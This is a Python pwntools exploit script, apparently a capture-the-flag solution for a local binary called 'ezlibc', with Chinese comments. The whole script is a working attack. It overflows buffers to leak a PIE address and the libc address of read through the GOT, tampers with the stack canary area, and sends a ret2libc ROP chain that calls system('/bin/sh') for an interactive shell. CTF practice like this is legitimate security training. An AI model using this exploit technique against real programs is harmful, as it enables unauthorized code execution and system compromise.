from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./ezlibc')
elf = ELF('./ezlibc')
read_got_offset = elf.got['read']
offset1 = 0x131D # sub_131D 的偏移

p.recvuntil(b'I will give u chance\n')
p.sendline(b'1825')
p.recvuntil(b'first tell me your name\n') 
payload1 = b'A' * 1808
p.send(payload1)
p.recvuntil(payload1)
leaked_pie_ptr_raw = p.recv(6) + b'\x00\x00'#填充小端序
leaked_pie_ptr = u64(leaked_pie_ptr_raw)
pie_base = leaked_pie_ptr - offset1
log.success(f"成功泄露 PIE 指针: {hex(leaked_pie_ptr)}")
log.success(f"计算出的 PIE Base: {hex(pie_base)}")


read_got_addr = pie_base + read_got_offset
p.recvuntil(b'now u can leak the libc\n')
p.send(p64(read_got_addr)) 


leaked_read_raw = p.recvline().strip() 
leaked_read_addr = u64(leaked_read_raw.ljust(8, b'\x00'))
log.success(f"成功泄露 read@libc 地址: {hex(leaked_read_addr)}")


libc = ELF('libc.so.6')#根据泄露的libc地址下载的libc
libc_base = leaked_read_addr - libc.symbols["read"]
log.success(f"计算出的 Libc Base: {hex(libc_base)}")

rop = ROP(libc)
pop_rdi_ret_addr = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
pop_ret_addr = libc_base + rop.find_gadget(['ret'])[0]
system_addr = libc_base + libc.symbols["system"]
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

p.recvuntil(b"Is there anything else you'd like to say in the end\n")
payload2 = b'A' * 1824 + b'\x09'
p.send(payload2)
new_canary_value = p64(pie_base + 0x40A0)
payload_final =  b'A' * 24      
payload_final += new_canary_value  
payload_final += b'A' * 8                  

payload_final += p64(pop_ret_addr)
payload_final += p64(pop_rdi_ret_addr)      
payload_final += p64(bin_sh_addr)           
payload_final += p64(system_addr)           

p.sendline(payload_final)
p.interactive()

